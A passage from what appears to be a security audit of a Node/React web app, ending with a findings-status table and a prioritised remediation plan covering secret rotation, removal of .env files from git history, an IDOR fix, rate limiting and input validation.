| Mixed route registration patterns | Fixed | Centralized `apiRouter` pattern in `routes/index.ts` |
| Bogus npm packages (`python`, `pytorch`) | Fixed | Not in current `package.json` |
| Missing security headers (no Helmet) | Fixed | Helmet v8.1.0 installed and active |
| Duplicate cache config in `.env` | Fixed | No duplicates in current `.env` |
| No test suite | Partially fixed | 26 test files exist (21 backend, 5 frontend) |

---

## Priority Action Plan

### Do Today (30 minutes)

1. **Rotate all secrets** (see C1 inventory table)
2. Set `NODE_ENV=production` in your Render/hosting environment variables
3. Set `VITE_DEMO_MODE=false` for production builds
4. Delete `console.log('Final MONGODB_URI:', MONGODB_URI)` from `server/src/db.ts`

### Do This Week (2-4 hours)

5. Remove `.env` files from git history using BFG
6. Remove `server/AWSCLIV2.pkg` from repo
7. Fix the parent portal `submitFeedback` IDOR (add relationship check)
8. Fix the parent portal `loadLinkedTeens` fallback (return `[]` not all teens)
9. Add file upload type/size validation
10. Remove `email` from public API responses

### Do Before Launch (1-2 days)

11. Add route-specific rate limiters for all sensitive endpoints
12. Tighten Zod schemas (enum constraints on `mediaType`, `visibility`)
13. Add HTTPS redirect middleware
14. Switch localStorage token storage to sessionStorage
15. Add LIKE wildcard escaping to user search
16. Clean up documentation bloat
17. Enforce minimum strength on secrets in env validation

---

*This document covers both the original MongoDB/Mongoose code paths and the refactored Prisma/Supabase code paths. Some issues exist in both. Fix the code path your friend is actively deploying.*
